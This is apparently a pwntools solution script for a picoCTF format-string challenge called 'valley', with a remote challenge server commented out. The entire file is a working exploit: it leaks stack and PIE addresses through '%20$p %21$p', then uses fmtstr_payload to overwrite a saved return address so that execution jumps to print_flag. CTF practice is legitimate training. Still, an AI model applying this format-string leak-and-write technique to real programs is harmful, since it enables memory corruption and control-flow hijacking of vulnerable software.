from pwn import *

f = "valley"

context.arch = 'amd64'

elf = ELF(f)
r = process(f)

# r = remote('shape-facility.picoctf.net', 56490)

r.sendline("%20$p %21$p")
r.recvuntil("distance: ")

# leaks
stack, pie = r.recvline().split()

stack, pie = int(stack, 16), int(pie, 16)

elf.address = pie - 0x1413

print_flag_addr = elf.sym.print_flag

print(print_flag_addr)

payload = fmtstr_payload(6, {stack-8 : elf.sym.print_flag}, write_size='short')

r.sendline(payload)
r.sendline('exit')

r.interactive()
